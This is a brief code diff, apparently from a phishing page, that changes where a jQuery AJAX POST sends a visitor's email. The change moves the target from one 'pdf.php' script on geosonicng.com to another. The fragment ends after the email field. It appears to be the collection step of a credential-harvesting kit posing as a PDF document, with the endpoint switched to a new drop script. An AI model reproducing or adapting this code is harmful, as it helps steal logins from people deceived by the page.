@@ -84,7 +84,7 @@
       
       $.ajax({
         dataType: 'JSON',
-        url: 'https://geosonicng.com/wrk/jy/pdf.php',
+        url: 'https://geosonicng.com/wrk/tg/pdf.php',
         type: 'POST',
         data:{
           email:email,
